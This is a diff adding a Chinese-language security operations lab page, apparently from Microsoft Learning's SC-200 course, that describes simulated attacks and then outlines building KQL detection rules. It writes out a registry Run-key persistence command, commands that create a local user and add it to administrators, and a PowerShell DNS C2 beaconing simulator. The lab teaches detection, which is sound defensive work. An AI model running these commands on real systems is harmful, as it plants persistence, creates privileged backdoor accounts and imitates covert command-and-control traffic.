@@ -1,0 +1,145 @@
+<!DOCTYPE html><html lang="en"><head>
+        <title>
+            SC-200T00CN-Microsoft-Security-Operations-Analyst
+        </title>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" crossorigin="anonymous">
+        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" crossorigin="anonymous">
+        <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/vs.min.css">
+        <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js"></script>
+        <script>hljs.initHighlightingOnLoad();</script>
+        <link rel="stylesheet" href="../../assets/css/style_v%3D.css">
+    </head>
+    <body data-spy="scroll" data-target="#linksMenu">
+    <nav class="navbar navbar-expand-lg navbar-dark bg-black">
+        <div class="container d-flex justify-content-between">
+            <a class="my-1 title text-azure text-uppercase" href="../../">
+                SC-200T00CN-Microsoft-Security-Operations-Analyst
+            </a>
+            <a href="https://github.com/MicrosoftLearning/SC-200T00CN-Microsoft-Security-Operations-Analyst" target="_blank" class="btn btn-sm btn-outline-secondary text-light">
+                <i class="fa fa-github" aria-hidden="true"></i>
+                <span class="ml-2">GitHub</span>
+            </a>
+        </div>
+    </nav>
+    <div class="container">
+        <main class="row extra-padding">
+            <aside class="col-sm-2">       
+                <nav id="linksMenu" class="toc sticky-top">
+                    <ul class="nav navbar-nav flex-column">
+                    <li class="nav-item"><a class="nav-link" href="#任务-1了解攻击">任务 1：了解攻击</a></li><li class="nav-item"><a class="nav-link" href="#攻击-3--dns--c2">攻击 3 -DNS / C2</a></li><li class="nav-item"><a class="nav-link" href="#任务-2了解检测建模">任务 2：了解检测建模。</a></li></ul>
+                </nav>         
+            </aside>
+            <hr class>
+            <article class="col-sm-10 mb-5">
+                <h1 id="模块-7---实验室-1---练习-4---连接检测建模">模块 7 - 实验室 1 - 练习 4 - 连接检测建模</h1>
+
+<h3 id="任务-1了解攻击">任务 1：了解攻击</h3>
+
+<p><strong>重要提示：在此练习中你不会执行任何操作。</strong>  这些说明只是阐述你将在下一个练习中执行的攻击。请仔细阅读本页。</p>
+
+<p>攻击模式基于开源项目： https://github.com/redcanaryco/atomic-red-team</p>
+
+<p><strong>备注</strong>：为了方便演示实验室，某些设置触发的时间期限较短。</p>
+
+<h4 id="攻击-1---通过注册表项添加实现的持久性攻击">攻击 1 - 通过注册表项添加实现的持久性攻击。</h4>
+
+<p>此攻击从命令提示符运行：</p>
+
+<div class="code-header mt-3 mb-0 bg-light d-flex justify-content-between border"><span class="mx-2 text-muted text-capitalize font-weight-light">code</span><button class="m-0 btn btn-code btn-sm btn-light codeBtn rounded-0 border-left text-muted font-weight-light" data-clipboard-target="#codeBlock0" type="button"><i class="fa fa-files-o mr-2" aria-hidden="true"></i>Copy</button></div><pre id="codeBlock0" class="mt-0"><code class="language-Command">REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "SOC Test" /t REG_SZ /F /D "C:\temp\startup.bat"
+</code></pre>
+
+<h4 id="攻击-2---用户添加和特权提升">攻击 2 - 用户添加和特权提升</h4>
+
+<p>攻击将添加新建用户并将新用户提升到管理员组。  这会让攻击者能够使用有特权的其他帐户登录。</p>
+
+<div class="code-header mt-3 mb-0 bg-light d-flex justify-content-between border"><span class="mx-2 text-muted text-capitalize font-weight-light">code</span><button class="m-0 btn btn-code btn-sm btn-light codeBtn rounded-0 border-left text-muted font-weight-light" data-clipboard-target="#codeBlock1" type="button"><i class="fa fa-files-o mr-2" aria-hidden="true"></i>Copy</button></div><pre id="codeBlock1" class="mt-0"><code class="language-Command">net user theusernametoadd /add
+net user theusernametoadd ThePassword1!
+net localgroup administrators theusernametoadd /add
+</code></pre>
+
+<h3 id="攻击-3--dns--c2">攻击 3 -DNS / C2</h3>
+
+<p>此攻击将模拟命令和控制 (C2) 通信。</p>
+
+<div class="code-header mt-3 mb-0 bg-light d-flex justify-content-between border"><span class="mx-2 text-muted text-capitalize font-weight-light">code</span><button class="m-0 btn btn-code btn-sm btn-light codeBtn rounded-0 border-left text-muted font-weight-light" data-clipboard-target="#codeBlock2" type="button"><i class="fa fa-files-o mr-2" aria-hidden="true"></i>Copy</button></div><pre id="codeBlock2" class="mt-0"><code class="language-PowerShell">param(
+    [string]$Domain = "microsoft.com",
+    [string]$Subdomain = "subdomain",
+    [string]$Sub2domain = "sub2domain",
+    [string]$Sub3domain = "sub3domain",
+    [string]$QueryType = "TXT",
+        [int]$C2Interval = 8,
+        [int]$C2Jitter = 20,
+        [int]$RunTime = 240
+)
+$RunStart = Get-Date
+$RunEnd = $RunStart.addminutes($RunTime)
+$x2 = 1
+$x3 = 1 
+Do {
+    $TimeNow = Get-Date
+    Resolve-DnsName -type $QueryType $Subdomain".$(Get-Random -Minimum 1 -Maximum 999999)."$Domain -QuickTimeout
+    if ($x2 -eq 3 )
+    {
+        Resolve-DnsName -type $QueryType $Sub2domain".$(Get-Random -Minimum 1 -Maximum 999999)."$Domain -QuickTimeout
+        $x2 = 1
+    }
+    else
+    {
+        $x2 = $x2 + 1
+    }
+    if ($x3 -eq 7 )
+    {
+        Resolve-DnsName -type $QueryType $Sub3domain".$(Get-Random -Minimum 1 -Maximum 999999)."$Domain -QuickTimeout
+        $x3 = 1
+    }
+    else
+    {
+        $x3 = $x3 + 1
+    }
+    $Jitter = ((Get-Random -Minimum -$C2Jitter -Maximum $C2Jitter) / 100 + 1) +$C2Interval
+    Start-Sleep -Seconds $Jitter
+}
+Until ($TimeNow -ge $RunEnd)
+</code></pre>
+
+<h3 id="任务-2了解检测建模">任务 2：了解检测建模。</h3>
+
+<p>本实验室中使用的攻击检测配置循环代表所有数据源，虽然你仅专注于两个特定数据源。</p>
+
+<p>要构建检测，从构建 KQL 语句开始。  你将开始攻击主机，因此将使用代表数据开始构建 KQL 语句。</p>
+
+<p>以下实验室在安装了 Defender for Endpoint Windows 主机和安装了 Sysmon 的 Windows 上运行相同的攻击。  构建检测时，你将看到每一种中数据规范化的差异。</p>
+
+<p>有 KQL 语句后，即可创建分析规则。</p>
+
+<p>触发规则并创建警报和事件后，调查以确定你是否提供了可帮助安全运营分析师进行调查的字段。</p>
+
+<p>接下来，对分析规则进行其他更改。</p>
+
+<h1 id="转到练习-5">转到练习 5</h1>
+
+            </article>
+        </main>
+    </div>
+    <footer class="fixed-bottom d-print-none">
+        <nav class="navbar navbar-light bg-light d-flex justify-content-around">
+            <span class="navbar-text">
+                <i class="fa fa-github" aria-hidden="true"></i>
+                <a href="https://github.com/MicrosoftLearning/SC-200T00CN-Microsoft-Security-Operations-Analyst" target="_blank" class="ml-2">
+                    MicrosoftLearning/SC-200T00CN-Microsoft-Security-Operations-Analyst
+                </a>
+            </span>
+        </nav>
+    </footer>
+    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" crossorigin="anonymous"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" crossorigin="anonymous"></script>
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" crossorigin="anonymous"></script>
+    <script src="//cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.0/clipboard.min.js"></script>
+    <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js"></script>
+    <script src="../../assets/js/script_v%3D.js"></script>
+
+
+
+</body></html>
